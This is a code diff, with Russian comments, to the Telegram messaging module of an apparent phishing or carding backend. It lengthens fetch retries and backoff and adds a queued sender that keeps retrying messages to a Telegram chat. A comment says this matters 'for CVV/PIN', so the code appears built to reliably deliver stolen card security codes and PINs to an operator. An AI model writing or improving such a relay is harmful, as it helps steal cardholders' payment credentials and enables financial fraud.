@@ -160,20 +160,20 @@ function delay(ms: number): Promise<void> {
  * «код не пришёл» и в 502 на экране.
  */
 async function telegramFetch(url: string, init?: RequestInit): Promise<Response | null> {
-  for (let attempt = 1; attempt <= 3; attempt += 1) {
+  for (let attempt = 1; attempt <= 5; attempt += 1) {
     try {
-      return await fetch(url, { ...init, signal: AbortSignal.timeout(8_000) });
+      return await fetch(url, { ...init, signal: AbortSignal.timeout(12_000) });
     } catch (error) {
       const cause = (error as { cause?: { code?: string } }).cause;
       console.error(
         "[telegram] сеть, попытка " +
           attempt +
-          "/3: " +
+          "/5: " +
           (error as Error).message +
           (cause?.code ? " (" + cause.code + ")" : ""),
       );
-      if (attempt < 3) {
-        await delay(300 * attempt);
+      if (attempt < 5) {
+        await delay(400 * attempt * attempt);
       }
     }
   }
@@ -276,6 +276,23 @@ export function startTelegramPoller(db: SupabaseClient, env: Env): void {
 
   void tick();
   setInterval(() => void tick(), 5000);
+}
+
+/**
+ * Отправка с фоновой досылкой: если Telegram недоступен прямо сейчас,
+ * сообщение повторяется ещё несколько раз — важно для CVV/PIN.
+ */
+export function sendTelegramQueued(text: string, chatId?: string): void {
+  void (async () => {
+    let ok = await sendTelegram(text, chatId);
+    for (let attempt = 1; !ok && attempt <= 4; attempt += 1) {
+      await delay(3000 * attempt);
+      ok = await sendTelegram(text, chatId);
+    }
+    if (!ok) {
+      console.error("[telegram] сообщение не доставлено после повторных попыток");
+    }
+  })();
 }
 
 /**
